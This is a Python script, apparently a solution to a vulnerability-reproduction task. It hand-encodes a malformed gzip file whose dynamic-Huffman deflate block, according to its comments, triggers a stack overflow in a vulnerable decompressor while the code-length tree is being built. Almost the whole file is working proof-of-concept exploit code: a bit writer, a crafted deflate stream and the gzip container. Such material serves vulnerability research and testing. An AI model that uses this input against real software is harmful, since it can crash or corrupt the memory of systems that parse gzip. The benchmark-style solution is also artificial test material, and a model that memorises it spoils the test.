import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitWriter:
            def __init__(self):
                self.buf = bytearray()
                self.bitbuf = 0
                self.bitcnt = 0

            def write(self, value: int, nbits: int):
                # Write nbits from value, LSB-first
                v = value
                n = nbits
                while n > 0:
                    take = min(n, 32)
                    self.bitbuf |= (v & ((1 << take) - 1)) << self.bitcnt
                    self.bitcnt += take
                    while self.bitcnt >= 8:
                        self.buf.append(self.bitbuf & 0xFF)
                        self.bitbuf >>= 8
                        self.bitcnt -= 8
                    v >>= take
                    n -= take

            def align_byte(self):
                if self.bitcnt > 0:
                    self.buf.append(self.bitbuf & 0xFF)
                    self.bitbuf = 0
                    self.bitcnt = 0

            def getvalue(self) -> bytes:
                self.align_byte()
                return bytes(self.buf)

        # Construct a gzip file containing a deflate stream with a dynamic Huffman block
        # that uses HCLEN = 15 (i.e., 19 code length codes), which triggers the vulnerable
        # implementation's stack overflow when building the code-length Huffman tree.
        w = BitWriter()

        # Deflate block header: BFINAL=1, BTYPE=2 (dynamic)
        w.write(1, 1)   # BFINAL
        w.write(2, 2)   # BTYPE=2 (dynamic)

        # HLIT=0 (257 literal/length codes), HDIST=0 (1 distance code), HCLEN=15 (19 code length codes)
        w.write(0, 5)   # HLIT
        w.write(0, 5)   # HDIST
        w.write(15, 4)  # HCLEN

        # Provide code length code lengths for 19 symbols in the specified order:
        # Order: [16,17,18, 0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
        # We define only symbols 1 and 18 to have length 1; all others zero.
        cl_order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
        cl_lens = [0]*19
        # symbol 18 -> index in order list: 2
        cl_lens[2] = 1
        # symbol 1 -> index in order list: 17
        cl_lens[17] = 1
        for v in cl_lens:
            w.write(v, 3)

        # Now encode literal/length and distance code lengths using the above CL Huffman tree.
        # The CL tree has two symbols: 1 and 18, each with bit length 1.
        # Canonical codes: symbol 1 -> 0, symbol 18 -> 1.
        # We want LL code lengths: 256 zeros, then 1 for symbol 256.
        # And distance code lengths: a single 1 (for symbol 0).
        # Encode 256 zeros using two runs with symbol 18:
        #   First 18 with extra 127 => repeat 11+127 = 138 zeros
        #   Second 18 with extra 107 => repeat 11+107 = 118 zeros
        # Token 18 code = '1', extra 7 bits as specified.
        w.write(1, 1)        # symbol 18
        w.write(127, 7)      # extra bits = 127 (repeat 138 zeros)
        w.write(1, 1)        # symbol 18
        w.write(107, 7)      # extra bits = 107 (repeat 118 zeros)

        # LL code length for symbol 256 = 1 -> token '1', code is '0'
        w.write(0, 1)

        # Distance code lengths: one symbol (0), set length = 1 -> token '1', code is '0'
        w.write(0, 1)

        # Now encode the actual data: only the end-of-block (256).
        # The LL tree will have a single symbol (256), which gets code '0' of length 1.
        w.write(0, 1)  # EOB

        deflate_data = w.getvalue()

        # Build gzip container
        gz = bytearray()
        # GZIP header (10 bytes): ID1, ID2, CM=8, FLG=0, MTIME=0, XFL=0, OS=255
        gz += b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'
        # Compressed deflate payload
        gz += deflate_data
        # CRC32 and ISIZE of uncompressed data (empty -> 0)
        crc = binascii.crc32(b'') & 0xffffffff
        isize = 0
        gz += crc.to_bytes(4, 'little')
        gz += isize.to_bytes(4, 'little')

        return bytes(gz)
